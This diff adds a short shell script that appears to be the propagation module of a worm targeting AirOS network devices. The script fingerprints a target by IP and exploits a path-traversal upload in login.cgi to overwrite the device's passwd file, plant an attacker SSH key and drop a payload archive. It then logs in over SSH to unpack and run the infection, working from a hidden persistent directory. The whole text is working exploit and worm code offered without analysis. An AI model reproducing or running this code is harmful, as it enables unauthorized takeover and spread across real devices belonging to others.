@@ -1,0 +1,33 @@
+#!/bin/sh
+ip=$1
+trap '' HUP
+chmod +x /etc/persistent/.mf/curl
+cd /etc/persistent/.mf/
+
+if [ "$2" = "dbss" ] ; then
+ ssh -f -y -y -i mfid mother@${ip} "tar -xf mf.tar ; /etc/persistent/.mf/i"
+ exit 0
+fi
+
+cu() {
+ wh=$1
+ to=$2
+ ur=$3
+ LD_LIBRARY_PATH=/etc/persistent/.mf/ ./curl -s -m 4 -F "file=@/etc/$wh;filename=../../etc/$to" -H "Expect:" "$ur/login.cgi" -k 2>/dev/null >/dev/null
+}
+
+is=`LD_LIBRARY_PATH=/etc/persistent/.mf/ ./curl -s -L -k -c /tmp/ac -m 3 $ip 2>/dev/null | grep airos | wc -l`
+if [ "$is" = "1" ] ; then
+ echo $ip >> /tmp/inf
+ cu passwd passwd http://${ip}
+ cu persistent/.mf/mfid.pub dropbear/authorized_keys http://${ip}
+ cu persistent/.mf/mf.tar persistent/mf.tar http://${ip}
+ cu passwd passwd https://${ip}
+ cu persistent/.mf/mfid.pub dropbear/authorized_keys https://${ip}
+ cu persistent/.mf/mf.tar persistent/mf.tar https://${ip}
+
+ ( /etc/persistent/.mf/infect $ip dbss ) &
+ ( sleep 15 ; killall ssh ) &
+ sleep 17 
+fi
+
